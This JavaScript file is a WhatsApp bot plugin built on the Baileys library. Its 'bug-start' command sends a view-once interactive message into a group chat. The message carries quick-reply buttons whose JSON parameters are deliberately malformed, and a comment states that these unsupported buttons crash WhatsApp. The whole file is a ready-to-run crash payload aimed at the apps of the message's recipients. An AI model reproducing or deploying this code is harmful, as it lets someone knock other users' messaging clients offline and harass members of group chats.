// arju - bhai ye bug wag kuchh nhi hai bs ye un supported buttons hain jo whatsapp crash karte hain

import fs from 'fs'
import { generateWAMessageFromContent } from '@whiskeysockets/baileys'
const {
    proto,
    generateWAMessage,
    areJidsSameUser
} = (await import('@whiskeysockets/baileys')).default

let handler = async (m, { conn, args, usedPrefix, command }) => {
	
	let _muptime
    if (process.send) {
      process.send('uptime')
      _muptime = await new Promise(resolve => {
        process.once('message', resolve)
        setTimeout(resolve, 1000)
      }) * 1000
    }
    let muptime = clockString(_muptime)
  let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "Danger bug used by admins"  
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: ""
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: 'BUG',
            subtitle: 'BUG',
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"WARNING\".WARNT\"id\":\".WART\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"DANGER\".bug\"id\":\".bug\"}"
              }  
           ],
          })
        })
    }
  }
}, {})

await conn.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
}) 
}
handler.help = ['bug']
handler.tags = ['DANGER']
handler.command = ['bug-start']
// handler.admin = true
handler.owner = true 
handler.group = true

export default handler

function clockString(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [d, 'd ', h, 'h ', m, 'm ', s, 's '].map(v => v.toString().padStart(2, 0)).join('')
	  }
